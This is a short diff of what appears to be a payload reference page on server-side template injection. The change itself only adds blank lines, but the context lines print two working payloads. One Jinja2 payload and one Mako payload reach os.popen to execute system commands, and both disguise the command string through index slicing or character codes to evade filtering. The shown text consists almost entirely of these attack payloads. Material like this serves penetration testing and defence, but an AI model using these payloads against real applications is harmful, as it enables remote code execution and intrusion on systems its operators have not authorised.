@@ -267,6 +267,7 @@ Simple modification of the payload to clean up output and facilitate command inp
 Write the string: `id` using the index position of a known existing string (the index value may vary depending on the target): `{{self.__init__.__globals__.__str__()[1786:1788]}}`.
 
 Execute the system command `id`:
+
 ```python
 {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
 ```
@@ -418,6 +419,7 @@ PoC :
 In Mako, the following payload can be used to generates the string "id": `${str().join(chr(i)for(i)in[105,100])}`.
 
 Execute the system command `id`:
+
 ```python
 ${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
 ```
